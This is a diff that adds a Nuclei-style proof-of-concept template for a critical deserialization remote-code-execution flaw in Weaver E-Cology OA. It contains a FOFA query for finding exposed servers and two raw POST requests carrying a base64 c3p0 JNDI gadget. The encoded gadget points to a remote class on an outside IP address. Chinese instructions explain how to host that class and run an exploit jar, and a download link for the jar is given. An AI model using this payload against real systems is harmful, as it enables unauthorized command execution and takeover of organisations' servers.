@@ -1,0 +1,117 @@
+id: poc-zrqcxgnf539920ak
+info:
+  name: 泛微OA E-Cology sync接口反序列化命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zrqcxgnf539920ak'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zrqcxgnf539920ak
+    fofa: body = "/wui/common/css/w7OVFont_wev8.css" || header="testBanCookie" || body="/wui/common/css/w7OVFont.css" || body="/js/ecology8" || body="alert('高效源于协同')" || body="wui/common/css/w7OVFont_wev8.css"|
+http:
+- raw:
+  - 'POST /synccach%65.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101
+
+    Firefox/93.0
+
+    Accept:
+
+    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q
+
+    =0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    cache: whoami
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 1085
+
+
+    data=rO0ABXNyAC5jb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuSm5kaVJlZkRhdGFTb3VyY2VCYXNlAAAA
+
+    AAAAAAEDAAZaAAdjYWNoaW5nTAAUZmFjdG9yeUNsYXNzTG9jYXRpb250ABJMamF2YS9sYW5nL1N0cmluZ
+
+    ztMAAdqbmRpRW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAIam5kaU5hbWV0ABJMamF2YS9sYW5nL0
+
+    9iamVjdDtMAANwY3N0ACJMamF2YS9iZWFucy9Qcm9wZXJ0eUNoYW5nZVN1cHBvcnQ7TAADdmNzdAAiTGp
+
+    hdmEvYmVhbnMvVmV0b2FibGVDaGFuZ2VTdXBwb3J0O3hwdwMAAQBwcHNyAD1jb20ubWNoYW5nZS52Mi5u
+
+    YW1pbmcuUmVmZXJlbmNlSW5kaXJlY3RvciRSZWZlcmVuY2VTZXJpYWxpemVkYhmF0NEqwhMCAARMAAtjb
+
+    250ZXh0TmFtZXQAE0xqYXZheC9uYW1pbmcvTmFtZTtMAANlbnZxAH4AAkwABG5hbWVxAH4ACEwACXJlZm
+
+    VyZW5jZXQAGExqYXZheC9uYW1pbmcvUmVmZXJlbmNlO3hwcHBwc3IAFmphdmF4Lm5hbWluZy5SZWZlcmV
+
+    uY2Xoxp6iqOmNCQIABEwABWFkZHJzdAASTGphdmEvdXRpbC9WZWN0b3I7TAAMY2xhc3NGYWN0b3J5cQB%
+
+    2bAAFMABRjbGFzc0ZhY3RvcnlMb2NhdGlvbnEAfgABTAAJY2xhc3NOYW1lcQB%2bAAF4cHNyABBqYXZhL
+
+    nV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2
+
+    VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAB1cgATW0xqYXZhLmxhbmcuT2J
+
+    qZWN0O5DOWJ8QcylsAgAAeHAAAAAKcHBwcHBwcHBwcHh0AAR0aHJldAAaaHR0cDovLzEwMS4zNC4yNDYu
+
+    MTg6ODA5MC90AAdleHBsb2l0eA%3d%3d
+
+
+    **把生成的class放到服务器上，启动web服务**
+
+    执行如下命令
+
+    java -jar c3p0_exp.jar http://xxx/:thre
+
+
+    把生成的base64放入下面post的数据中，需要url编码'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /synccach%65.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    cache: whoami
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 1085
+
+
+    data=rO0ABXNyAC5jb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuSm5kaVJlZkRhdGFTb3VyY2VCYXNlAAAAAAAAAAEDAAZaAAdjYWNoaW5nTAAUZmFjdG9yeUNsYXNzTG9jYXRpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAdqbmRpRW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAIam5kaU5hbWV0ABJMamF2YS9sYW5nL09iamVjdDtMAANwY3N0ACJMamF2YS9iZWFucy9Qcm9wZXJ0eUNoYW5nZVN1cHBvcnQ7TAADdmNzdAAiTGphdmEvYmVhbnMvVmV0b2FibGVDaGFuZ2VTdXBwb3J0O3hwdwMAAQBwcHNyAD1jb20ubWNoYW5nZS52Mi5uYW1pbmcuUmVmZXJlbmNlSW5kaXJlY3RvciRSZWZlcmVuY2VTZXJpYWxpemVkYhmF0NEqwhMCAARMAAtjb250ZXh0TmFtZXQAE0xqYXZheC9uYW1pbmcvTmFtZTtMAANlbnZxAH4AAkwABG5hbWVxAH4ACEwACXJlZmVyZW5jZXQAGExqYXZheC9uYW1pbmcvUmVmZXJlbmNlO3hwcHBwc3IAFmphdmF4Lm5hbWluZy5SZWZlcmVuY2Xoxp6iqOmNCQIABEwABWFkZHJzdAASTGphdmEvdXRpbC9WZWN0b3I7TAAMY2xhc3NGYWN0b3J5cQB%2bAAFMABRjbGFzc0ZhY3RvcnlMb2NhdGlvbnEAfgABTAAJY2xhc3NOYW1lcQB%2bAAF4cHNyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKcHBwcHBwcHBwcHh0AAR0aHJldAAaaHR0cDovLzEwMS4zNC4yNDYuMTg6ODA5MC90AAdleHBsb2l0eA%3d%3d
+
+
+    **c3p0_exp.jar链接：**[**https://pan.quark.cn/s/3f981f3a9bf8**](https://pan.quark.cn/s/3f981f3a9bf8)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
